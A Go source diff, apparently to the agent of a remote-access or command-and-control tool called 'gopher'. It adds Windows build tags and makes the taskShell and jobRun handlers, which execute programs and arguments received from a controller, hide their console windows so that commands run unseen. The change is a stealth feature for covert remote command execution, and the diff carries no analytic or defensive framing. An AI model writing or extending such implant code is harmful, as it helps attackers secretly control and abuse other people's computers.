@@ -1,3 +1,6 @@
+//go:build windows
+// +build windows
+
 package main
 
 import (
@@ -11,7 +14,6 @@ import (
 	"crypto/x509"
 	"errors"
 	"fmt"
-	"github.com/vmihailenco/msgpack/v5"
 	"gopher/functions"
 	"gopher/utils"
 	"io"
@@ -22,6 +24,8 @@ import (
 	"sync"
 	"syscall"
 	"time"
+
+	"github.com/vmihailenco/msgpack/v5"
 )
 
 var UPLOADS map[string][]byte
@@ -416,6 +420,7 @@ func taskShell(paramsData []byte) ([]byte, error) {
 	}
 
 	cmd := exec.Command(params.Program, params.Args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	output, _ := cmd.CombinedOutput()
 
 	return msgpack.Marshal(utils.AnsShell{Output: string(output)})
@@ -679,6 +684,7 @@ func jobRun(paramsData []byte) ([]byte, error) {
 
 	procCtx, procCancel := context.WithCancel(context.Background())
 	cmd := exec.CommandContext(procCtx, params.Program, params.Args...)
+	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 	stdoutPipe, err := cmd.StdoutPipe()
 	if err != nil {
 		procCancel()
